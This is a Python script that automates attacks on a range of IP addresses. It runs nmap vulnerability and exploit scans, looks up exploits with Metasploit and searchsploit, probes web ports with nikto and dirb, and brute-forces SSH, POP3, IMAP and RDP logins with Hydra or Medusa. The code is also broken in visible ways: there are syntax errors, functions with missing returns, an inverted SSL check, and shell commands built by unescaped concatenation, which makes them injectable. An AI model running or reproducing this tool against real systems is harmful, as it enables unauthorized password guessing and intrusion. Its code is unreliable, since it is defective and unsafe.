import argparse
import re
import sys
import os
from lxml import etree
from xml.etree import ElementTree
import re

HTTP_WORDLIST = "./custom_url_wordlist.txt"
HTTP_EXTENSIONS_FILE = "./custom_extensions_common.txt"
METASPLOIT_SCAN_SCRIPT = './metasploit_scan_script'
USERLIST_HYDRA_SSH = "./user_wordlist_short.txt"
USERLIST_HYDRA_POP3 = "./user_wordlist_short.txt"
USERLIST_HYDRA_IMAP = "./user_wordlist_short.txt"
USERLIST_HYDRA_RDP = "./user_wordlist_short.txt"
USERLIST_HYDRA_SMB = "./user_wordlist_short.txt"
PASSLIST_HYDRA = "./fasttrack.txt"
PASSLIST_HYDRA_SSH = PASSLIST_HYDRA
PASSLIST_HYDRA_POP3 = PASSLIST_HYDRA
PASSLIST_HYDRA_IMAP = PASSLIST_HYDRA
PASSLIST_HYDRA_RDP = PASSLIST_HYDRA
PASSLIST_HYDRA_SMB = PASSLIST_HYDRA
script_syn = 'script-syn'
udp = 'udp'
syn = 'syn'


def isSudo():
    os.getuid() == 0


def generate_addresses(sections):
    a, b, c, d, e = sections
    if int(d) >= 256 or int(d) >= 256 or
    int(a) >= 256 or int(b) >= 256 or
    int(c) >= 256:
        print("BAD IP ADDRESS RANGE")
        sys.exit()
    if e != '':
        if int(d) > int(e) or int(e) >= 256:
            print("BAD IP ADDRESS RANGE")
            sys.exit()

    if e != '':
        for i in range(int(d), int(e) + 1):
            yield a + "." + b + "." + c + "." + str(i)
    else:
        yield a + "." + b + "." + c + "." + d


ip_regex = "^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\."+
"([0-9]{1,3})[\-]{0,1}([0-9]{0,3})$"
parser = argparse.ArgumentParser(
    description=' implementation written in python')
parser.add_argument('-t', '--targetip',
                    help='target ip address',
                    required='True')
parser.add_argument('-f', '--reportpath',
                    help='report path',
                    required='True')
parser.add_argument('-p', '--phases',
                    help='phases (i - information gathering,' +
                    ' v - vulnerability asessment, ' +
                    'd - dictionary attack)',
                    required='True')
parser.add_argument('-n', '--threads',
                    help='number of threads for dictionary' +
                    ' attack (default 4)',
                    default=4)
parser.add_argument('--medusa', action='store_true')
args = parser.parse_args()
print(args.targetip)
print(args.reportpath)
print(args.phases)


def tcpServiceOpen(path, name, tunneled):
    tre = etree.parse(path+"/IG/NMAP/"+script_syn+".xml")
    if tunneled:
        return len(
            tre.xpath(
                "//port[state[@state='open'] and service[@name='"+name+"']]"
            )
        ) > 0
    else:
        return len(
            tre.xpath(
                "//port[state[@state='open'] and service[@name='" +
                name+"' and @tunnel='ssl']]"
            )
        ) > 0


def udpServiceIsOn(path, name):
    tre = etree.parse(path+"/IG/NMAP/"+script_syn+".xml")
    len(
        tre.xpath(
            "//port[state[@state='open|filtered'] and service[@name='" +
            name+"']]"
        )
    ) > 0


def iteratePorts(path, name, tunneled):
    tre = etree.parse(path+"/IG/NMAP/"+script_syn+".xml")
    if tunneled:
        return [
            port.attrib['portid']
            for port in tre.xpath(
                "//port[state[@state='open'] and service[@name='"+name+"']]"
            )
        ]
    else:
        return [
            port.attrib['portid']
            for port in len(tre.xpath(
                "//port[state[@state='open'] and service[@name='" +
                name + "' and @tunnel='ssl']]"
            )
            )]


def printVulnerabilities(path):
    tre = etree.parse(path+"/IG/NMAP/"+script_syn+".xml")

    return tre.xpath(
        "//table[elem[text()='VULNERABLE' and @key='state']]/@key"
    )

# Information Gathering (IG) phase


def ig(ip, path):

    print('starting Information Gathering phase (IG) ...')
    try:
        os.mkdir(path + '/IG')
        os.mkdir(path + '/IG/NMAP')
    except:
        print("created dirs")
    print('nmap is scanning...')
    print('start syn-scan with syn-probe...')

    os.system('nmap -vvv -oA "' + path+'/IG/NMAP/'+script_syn+'"' +
              ' -PE -PS80,443,22,25,110,445 -PU -PP -PA80,443,22,25,110,445' +
              ' -sS -p- -sV --allports -O --fuzzy ' +
              '--script ' +
              '"(default or auth or vuln or exploit) and not http-enum" "' +
              ip+'"   | grep \'Host seems down\' >' +
              ' /dev/null && { print_failure ' +
              '\'Host down\' ; rm -fR "'+path+'"; continue; } '
              )
    os.system("grep -v '|' \"" + path + "/IG/NMAP/"+script_syn +
              ".nmap\" > \"" + path + "/IG/NMAP/" + syn + ".nmap\"")
    os.system('xsltproc ' + path+'/IG/NMAP/'+script_syn +
              '.xml -o '+path+'/IG/NMAP/'+script_syn+'.html')
    print('start udp-scan with udp-probe...')
    os.system('nmap -vvv -oA "' + path +
              '/IG/NMAP/' + udp + '" -PE -PS80,443,22,25,110,445 ' +
              ' -PU -PP -PA80,443,22,25,110,445 ' +
              '-sU --top-ports 200 -sV --allports "' +
              ip +
              '" > /dev/null || ' +
              'failure "NMAP ERROR (UDP-SCAN); exit with code $?"'
              )
    
    os.system('xsltproc ' + path+'/IG/NMAP/'+udp +
              '.xml -o '+path+'/IG/NMAP/'+udp+'.html')
    print('metasploit is scanning...')
    os.system('service postgresql start')
    os.system('msfconsole -q -o "'+path+'/IG/metasploit_scan.txt" ' +
              '-x "setg rhosts ' +
              ip+' ; resource '+METASPLOIT_SCAN_SCRIPT+' ; exit -y"'
              )

# Vulnerability Asessment (VA) phase


def va(ip, path):
    tre = etree.parse(path+"/IG/NMAP/"+script_syn+".xml")
    vulns = tre.xpath('//script[@id="vulners"]')
    print('Starting Vulnerability Asessment (VA)...')
    try:
        os.mkdir(path + '/VA')
        os.mkdir(path + '/VA/KNOWN_EXPLOITS')
    except:
        print("Created dirs")
    vuln_ids = []
    if len(vulns) > 0:
        vuln_ids = [row.text for row in vulns[0].xpath(
            'table/table/elem[@key="id"]')]
    cvs_file_object = open(path+"/IG/NMAP/CVE.txt", 'a')
    cvs_file_object_raw = open(path+"/IG/NMAP/CVE_raw.txt", 'a')
    cvsn = 0
    raw_xml = ElementTree.tostring(
        tre.getroot(), encoding='utf8', method='xml').decode('utf-8')
    cvsl = [m.group() for m in re.finditer('CVE-\d{4}-\d{4,7}', raw_xml)]
    for cvs in [vid for vid in vuln_ids if "CVE" in vid]:
        cvs_file_object.write("search cve:"+re.sub("CVE-", "", cvs)+"\n")
        cvs_file_object_raw.write(cvs)
        cvsn += 1
    if len(vuln_ids) > 0:
        print("Found vulnerabilites and exploits: "+", ".join(vuln_ids))
    if cvsn > 0:
        print('Starting Metasploit research...')
        os.system('msfconsole -q -o "'+path +
                  '/VA/KNOWN_EXPLOITS/meta_module.txt" ' +
                  '-x "db_rebuild_cache ; resource ' +
                  path+'/IG/NMAP/CVE.txt ; exit -y"'
                  )
        print('starting searchsploit...')
        os.system('searchsploit --www --nmap "'+path+'/IG/NMAP/' +
                  script_syn+'.xml" > "' +
                  path+'/VA/KNOWN_EXPLOITS/exploit-db.txt"'
                  )
        os.system('searchsploit --www --nmap "'+path+'/IG/NMAP/' +
                  udp+'.xml" > "'+path+'/VA/KNOWN_EXPLOITS/exploit-db.txt"')
    else:
        print('No exploits or vulnerabilites found!')
        os.system('touch "'+path+'/VA/KNOWN_EXPLOITS/NO_cve_found.txt"')
    plugins = '''ms10_070;report_html;embedded;cookies;put_del_test;
                outdated;drupal(0:0);clientaccesspolicy;msgs;httpoptions;
                negotiate;parked;favicon;apache_expect_xss;headers'''
    if tcpServiceOpen(path, 'http', '0'):
        print('starting nikto (http)...')
        for port in iteratePorts(path, 'http', '0'):
            print("Nikto port: "+port)
            os.system('nikto -Display PV -nolookup ' +
                      '-ask no -Format htm -host ' +
                      ip+':'+port+' -output "'+path+'/VA/nikto_'+port +
                      '.html" -Plugins ' +
                      ' "'+plugins+'" ' +
                      ' -Tuning 4890bcde > /dev/null'
                      )
        for port in iteratePorts(path, 'http', '0'):
            print("Dirb port:  "+port)
            os.system('dirb "http://'+ip+':'+port+'/" "' +
                      HTTP_WORDLIST+'" -r -l -o "'+path +
                      '/VA/dirb_'+port+'.txt" -x "' +
                      HTTP_EXTENSIONS_FILE+'" -z 200 > /dev/null'
                      )
    if tcpServiceOpen(path, 'https', '0'):
        print('starting nikto (https)...')
        for port in iteratePorts(path, 'http', '0'):
            print("Nikto port: "+port)
            os.system('nikto -Display PV -nolookup ' +
                      '-ask no -Format htm -host ' +
                      ip+':'+port+' -output "'+path+'/VA/nikto_https_'+port +
                      '.html" -Plugins ' +
                      '"'+plugins+'" ' +
                      '-Tuning 4890bcde > /dev/null')
        for port in iteratePorts(path, 'http', '0'):
            print("Dirb port:  "+port)
            os.system('dirb "https://'+ip+':'+port+'/" "'
                      + HTTP_WORDLIST+'" -r -l -o "'+path +
                      '/VA/dirb_https_'+port+'.txt" -x "'
                      + HTTP_EXTENSIONS_FILE+'" -z 200 > /dev/null'
                      )
    if tcpServiceOpen(path, 'http', '1'):
        print('starting nikto (http)...')
        for port in iteratePorts(path, 'http', '1'):
            print("Nikto port: "+port)
            os.system('nikto -Display PV -nolookup -ask no -Format htm -host '
                      + ip + ':' + port + ' -output "' + path +
                      '/VA/nikto_https_' + port + '.html" -Plugins' +
                      ' "'+plugins+'" ' +
                      '-Tuning 4890bcde > /dev/null')
        for port in iteratePorts(path, 'http', '1'):
            print("Dirb port:  "+port)
            os.system(
                'dirb "https://'+ip+':'+port+'/" "'+HTTP_WORDLIST+'" ' +
                '-r -l -o "'+path +
                '/VA/dirb_https_'+port+'.txt" -x "'
                + HTTP_EXTENSIONS_FILE +
                '" -z 200 > /dev/null'
            )


def hydra_attack(ip, port, path, prot, ul, pl, outpref, evid, threads):
    os.system(
        'hydra -s '+port+' -v -V -o "'+path+'/DA/PASSWORD/'+outpref+'.txt" -L '
        + ul+' -P ' + pl + ' -t ' + str(threads) + ' '+ip+' '+prot+' > "' +
        path+'/DA/EVIDENCE/'+evid+'.txt"'
    )
    os.system('"grep \'host:\' "'+path+'/DA/PASSWORD/' +
              outpref+'.txt" || echo \'PASSWORD NOT FOUND\'"')


def medusa_attack(ip, port, path, prot, ul, pl, outpref, evid, threads):
    os.system(
        'medusa -M '+prot+' -n ' + port + ' -h ' + ip +
        ' -U ' + ul + ' -P ' + pl + ' -L -O "'+path +
        '/DA/PASSWORD/medusa_'+outpref + '.txt" -t '+threads +
        ' > "'+path+'/DA/EVIDENCE/medusa_'+evid+'.txt"'
    )

    os.system('grep \'ACCOUNT FOUND\' "'+path+'/DA/PASSWORD/medusa_' +
              outpref+'.txt" || echo \'PASSWORD NOT FOUND\'')


def dictionary_attack(
    ip, port, path, prot, ul, pl,
    outpref, evid, threads, medusa
):
    if medusa:
        medusa_attack(ip, port, path, prot, ul, pl, outpref, evid, threads)
    else:
        hydra_attack(ip, port, path, prot, ul, pl, outpref, evid, threads)

# Dictionary Attack (DA) phase


def da(ip, path):
    print('Starting Dictionary Attacks (DA)...')
    try:
        os.mkdir(path + '/DA')
        os.mkdir(path + '/DA/PASSWORD')
        os.mkdir(path + '/DA/EVIDENCE')
    except:
        print("created dirs")
    dictionaryVariants = [
        [
            'ssh', '0', 'ssh', 'starting dictionary ' +
            'attack against SSH service...',
            USERLIST_HYDRA_SSH, PASSLIST_HYDRA_SSH,
            'cred_ssh', 'ssh_attack'
        ],
        [
            'pop3', '0', 'pop3', 'starting dictionary attack against POP3 ' +
            '(clear pass) service...',
            USERLIST_HYDRA_POP3, PASSLIST_HYDRA_POP3,
            'cred_pop3', 'pop3_attack'
        ],
        [
            'pop3s', '0', 'pop3s', 'starting dictionary attack against POP3 ' +
            '(plain pass over ssl connection) service...',
            USERLIST_HYDRA_POP3, PASSLIST_HYDRA_POP3,
            'cred_pop3s', 'pop3s_attack'
        ],
        [
            'pop3', '1', 'pop3',
            'starting dictionary attack against SSL/POP3 ' +
            '(plain pass over ssl connection) service...',
            USERLIST_HYDRA_POP3, PASSLIST_HYDRA_POP3,
            'cred_ssl_pop3', 'ssl_pop3_attack'
        ],
        [
            'imap', '0', 'imap', 'starting dictionary attack against ' +
            'IMAP (clear pass) service...',
            USERLIST_HYDRA_IMAP, PASSLIST_HYDRA_IMAP,
            'cred_imap', 'imap_attack'
        ],
        [
            'imaps', '0', 'imaps',
            'starting dictionary attack against IMAPS ' +
            '(plain pass over ssl connection) service...',
            USERLIST_HYDRA_IMAP, PASSLIST_HYDRA_IMAP,
            'cred_imaps', 'imaps_attack'
        ],
        [
            'ms-wbt-server', '0', 'rdp',
            'starting dictionary attack against RDP service (no domain)...',
            USERLIST_HYDRA_RDP, PASSLIST_HYDRA_RDP,
            'cred_rdp', 'rdp_attack'
        ],
        [
            'ms-wbt-server', '1', 'rdp',
            'starting dictionary attack against SSL/RDP service...',
            USERLIST_HYDRA_RDP, PASSLIST_HYDRA_RDP,
            'cred_ssl_rdp', 'ssl_rdp_attack'
        ],
    ]
    for protocolName, tuneled, protocol, caption,
    userlist, passlist, outa, outb in dictionaryVariants:
        if tcpServiceOpen(path, protocolName, tuneled):
            print(caption)
            for port in iteratePorts(path, protocolName, tuneled):
                dictionary_attack(
                    ip, port, args.reportpath+"/"+ip,
                    protocol, userlist, passlist,
                    outa, outb, args.threads, args.medusa
                )


if __name__ == "__main__":
    forbidden_signs = "qwertyuiopasdfghjklzxcvbnm,:;#@[]/%|"
    if 1 in [c in args.targetip for c in forbidden_signs]:
        print('TARGET IP CONTAINS INVALID CHARACTERS [not use CIDR notation]')
        sys.exit()
    if re.match(ip_regex, args.targetip) == None:
        print('BAD IP ADDRESS')
        sys.exit()
    if os.path.isdir('./'+args.reportpath) == False:
        print(args.reportpath+": DIRECTORY NOT FOUND")
        sys.exit()
    a, b, c, d, e = re.match(ip_regex, args.targetip).groups()
    for ip in generate_addresses([a, b, c, d, e]):
        print(ip)
        if os.system("ping -c 1 "+ip) == 0:
            if os.path.isdir('./'+args.reportpath+"/"+ip) == False:
                os.mkdir(args.reportpath+"/"+ip)
            for char in args.phases:
                if char == "i":
                    ig(ip, args.reportpath+"/"+ip)
                elif char == "v":
                    va(ip, args.reportpath+"/"+ip)
                elif char == "d":
                    da(ip, args.reportpath+"/"+ip)
        else:
            print("Ip address "+ip+" is unreachable")
